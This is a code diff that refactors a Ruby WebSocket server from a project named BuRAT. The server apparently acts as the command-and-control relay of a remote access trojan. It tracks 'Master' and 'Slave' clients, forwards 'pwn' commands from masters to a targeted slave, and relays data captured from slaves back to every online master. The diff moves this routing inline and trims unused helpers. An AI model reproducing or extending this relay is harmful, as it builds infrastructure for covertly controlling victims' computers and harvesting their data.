@@ -1,10 +1,6 @@
 require 'faye/websocket'
 require 'json'
 
-require_relative 'lib/client'
-require_relative 'lib/inator'
-require_relative 'lib/pipe'
-
 module BuRAT
   class WebSocketServer
     KEEPALIVE_TIME = 15 # in seconds
@@ -35,20 +31,25 @@ module BuRAT
             p header
             #p trailer                       # debug
 
-            if header == "client_list" then               # list of client
-              packet = packet('client_list', @clients, 'deathnote')
+            if header == "clients" then     # clients - list of clients
+              packet = packet("clients", @clients, 'deathnote')
               ws.send(packet)
-            elsif header == "client_identification" then  # identification
-              client = @clients.find { |client| client["id"] == payload['id'] }
+            elsif header == "client" then   # client - client identification
+              client = @clients.find { |client| client["id"] == payload["id"] }
               payload.store("status", "Online")
               payload.store("ws", ws)
               client == nil ? @clients << payload : client.replace(payload)
-              packet = packet('client_status', payload, "disconnected")
-              master('*', packet)
-            elsif header == "data" then                   # data
-              data(payload, trailer)                      # payload = data from slave to master
-            elsif header == "pwn" then                    # pwn
-              pwn(payload, trailer)                       # payload = pwn from master to slave
+              packet = packet("client", payload, "disconnected")
+              masters = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
+              masters.each { |master| master["ws"].send(packet) }
+            elsif header == "data" then     # data - send to master and pipe to self
+              packet = packet("data", payload, trailer)
+              masters = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
+              masters.each { |master| master["ws"].send(packet) }
+            elsif header == "pwn" then      # pwn - send to other clients
+              packet = packet("pwn", payload, trailer)
+              client = @clients.find { |client| client["id"] == payload["client.id"]}
+              client["ws"].send(packet)
             elsif header == "pipe" then                   # pipe
               pipe(payload)                               # soon...
             elsif header == 'config' then                 # config
@@ -65,8 +66,9 @@ module BuRAT
           client = @clients.find { |client| client["ws"] == ws }
           client["status"] = "Offline"
           client["ws"] = nil
-          packet = packet('client_status', client, "disconnected")
-          master('*', packet)
+          packet = packet('client', client, "disconnected")
+          masters = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
+          masters.each { |master| master["ws"].send(packet) }
         end
 
         # Return async Rack response
@@ -78,41 +80,6 @@ module BuRAT
     end
 
     private
-    def master(id, packet)
-      if id == "*" then
-        clients = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
-        clients.each { |client| client["ws"].send(packet) }
-      else
-        client = @clients.find { |client| client["id"] == id && client["status"] == "Online" }
-        client["ws"].send(packet)
-      end
-    end
-
-    def slave(id, packet)
-      if id == "*" then
-        clients = @clients.select { |client| client["type"] == "Slave" && client["status"] == "Online" }
-        clients.each { |client| client["ws"].send(packet) }
-      else
-        client = @clients.find { |client| client["id"] == id && client["status"] == "Online" }
-        client["ws"].send(packet)
-      end
-    end
-
-    # DATA
-    # {'header': 'data', 'payload': {'client.id': '', 'inator.id': '', 'data': ''}, 'trailer': ''}
-    def data(payload, trailer)
-      packet = packet('data', payload, trailer)
-      master('*', packet)
-      # pipe data
-    end
-
-    # PWN
-    # {'header': 'pwn', 'payload': {'client.id': '', 'inator.id': '', 'data': ''}, 'trailer': ''}
-    def pwn(payload, trailer)
-      packet = packet('pwn', payload, trailer)
-      slave(payload['client.id'], packet)
-    end
-
     #pipe
     def pipe(payload)
       p payload
@@ -125,7 +92,7 @@ module BuRAT
 
     #packet
     def packet(header, payload, trailer)
-      packet = {'header' => header, 'payload' => payload, 'trailer' => trailer}.to_json
+      {'header' => header, 'payload' => payload, 'trailer' => trailer}.to_json
     end
 
   end
